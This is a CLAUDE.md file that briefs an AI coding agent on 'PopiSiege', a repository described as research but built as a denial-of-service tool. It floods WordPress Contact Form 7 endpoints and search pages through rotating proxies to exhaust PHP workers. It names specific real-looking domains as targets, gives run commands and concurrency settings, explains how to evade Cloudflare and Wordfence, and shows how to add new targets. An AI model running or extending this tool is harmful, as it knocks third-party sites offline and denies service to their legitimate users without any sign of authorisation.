# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project

PopiSiege is a WordPress Contact Form 7 (CF7) worker exhaustion research tool. It sends concurrent CF7 form submissions and search requests through rotating proxies to measure PHP worker pool exhaustion thresholds and WAF rate-limiting effectiveness.

**Key finding:** CF7 REST API (`/wp-json/contact-form-7/v1/contact-forms/{ID}/feedback`) always returns `cf-cache-status: DYNAMIC` — every POST bypasses Cloudflare CDN and hits the origin server directly. At concurrency ≥ PHP worker limit, legitimate users get 522/524 errors.

## Setup

```bash
pip3 install -r requirements.txt        # requests[socks] + stem
```

No build step. All scripts are standalone Python 3.

## Running

```bash
# CF7 worker exhaustion
python3 popisiege.py                                    # default: metoo-shatkin.com, concurrency=19
python3 popisiege.py --target metoo-buffalo.com         # concurrency=25
python3 popisiege.py --concurrency 40 --verbose

# WordPress search flood (PHP + MySQL simultaneously)
python3 search_flood.py                                 # default: metoo-buffalo.com, concurrency=50
python3 search_flood.py --target metoo-shatkin.com --concurrency 30

# Refresh proxy list from 12 sources (takes ~3 min)
python3 proxy_tester.py                                 # saves to /tmp/working_proxies.txt
python3 proxy_tester.py --output proxies.txt --workers 200

# Global install on VPS (creates popisiege and search-flood commands)
curl -sSL https://raw.githubusercontent.com/orospor/PopiSiege/main/install.sh | sudo bash
```

## Architecture

### Module dependency
```
proxy_pool.py          ← shared by all scripts
├── popisiege.py
├── search_flood.py
└── proxy_tester.py
```

`proxy_pool.py` is the single source of truth for:
- `SOURCES` — 12 GitHub-hosted proxy lists (TheSpeedX, Proxifly, monosans, ShiftyTR, clarketm, hookzof, roosterkid)
- `ProxyPool` class — thread-safe, with `maybe_refresh()` auto-refresh
- `fetch_and_test()` — fetches all sources, tests in parallel, returns sorted list

### ProxyPool auto-refresh
After every burst, `pool.maybe_refresh()` is called. If `alive/total < 50%`, a daemon thread fetches all 12 sources (~8000 proxies), tests them at 150 workers, merges new working proxies into the live pool, resets the dead set, and persists to `proxies.txt`. The main attack loop never pauses.

### Proxy file
`proxies.txt` is bundled in the repo — 110 pre-tested working proxies sorted by speed. Scripts load it directly at startup with no testing. It is overwritten in-place when auto-refresh completes or when `proxy_tester.py` runs.

### Known targets
Defined in `popisiege.py:TARGETS` dict:
```python
"metoo-shatkin.com":  form_id=50,  unit_tag=wpcf7-f50-p30-o1,  threshold=19
"metoo-buffalo.com":  form_id=248, unit_tag=wpcf7-f248-p850-o1, threshold=25
```
`threshold` = measured PHP worker limit. Default concurrency is taken from this value.

### Cloudflare bypass
- Cloudflare blocks `python-requests/*` UA with 403. All sessions must use `BROWSER_UA` (Chrome/124).
- Cloudflare blocks all Tor exit IPs by category — Tor rotation does not work.
- Free datacenter proxies bypass Wordfence IP bans but not Cloudflare Bot Fight Mode.

### Attack flow
```
burst() → ThreadPoolExecutor(concurrency) → send_one() per thread
  → ProxyPool.next()          (round-robin, skip dead)
  → requests.Session.post()   (browser UA, proxy set)
  → mark_dead() on exception
burst returns → pool.maybe_refresh() → back to while True
```

`search_flood.py` follows the same pattern but uses `GET /?s=<random_word>` instead of a CF7 POST. Response size (KB) is tracked as an additional metric — full HTML page vs 200-byte JSON response.

## Adding a new target

Add an entry to `TARGETS` in `popisiege.py`:
```python
"example.com": {
    "url":       "https://example.com/wp-json/contact-form-7/v1/contact-forms/{ID}/feedback",
    "form_id":   "{ID}",
    "unit_tag":  "wpcf7-f{ID}-p{page_id}-o1",
    "threshold": 20,
}
```
Form ID = WordPress post ID assigned when the CF7 form is created. Find it via `GET /wp-json/contact-form-7/v1/contact-forms` or by inspecting the form's hidden `_wpcf7` field in the page source.

## Repo
`https://github.com/orospor/PopiSiege` — push access via `orospor` account.
